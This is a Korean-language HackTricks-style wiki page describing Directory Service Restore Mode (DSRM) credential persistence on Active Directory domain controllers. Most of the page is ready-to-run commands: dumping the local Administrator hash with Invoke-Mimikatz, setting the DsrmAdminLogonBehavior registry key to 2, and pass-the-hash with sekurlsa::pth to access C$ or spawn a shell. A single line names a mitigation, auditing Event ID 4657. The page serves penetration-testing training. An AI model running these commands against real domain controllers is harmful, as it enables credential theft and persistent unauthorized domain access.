# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

각 **DC** 내부에는 **local administrator** 계정이 있습니다. 이 머신에서 admin privileges를 보유하면 mimikatz를 사용해 **local Administrator hash**를 **dump**할 수 있습니다. 그런 다음 registry를 수정하여 **이 password를 activate**하면 이 **local Administrator user**에 원격으로 access할 수 있습니다.\
먼저 DC 내부의 **local Administrator** user의 **hash**를 **dump**해야 합니다:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
그런 다음 해당 계정이 작동하는지 확인해야 하며, 레지스트리 키의 값이 "0"이거나 존재하지 않는 경우 **"2"로 설정해야 합니다**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
그런 다음 PTH를 사용하여 **C$의 콘텐츠를 나열하거나 심지어 shell을 획득할 수 있습니다**. 해당 hash를 메모리에 저장한 상태로(PTH를 위해) 새로운 powershell 세션을 생성할 때 사용되는 **"domain"은 단지 DC machine의 이름이라는 점에 유의하세요**:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
이와 관련된 자세한 정보는 다음에서 확인할 수 있습니다: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) 및 [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## 완화

- Event ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` 생성/변경 감사

## References

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
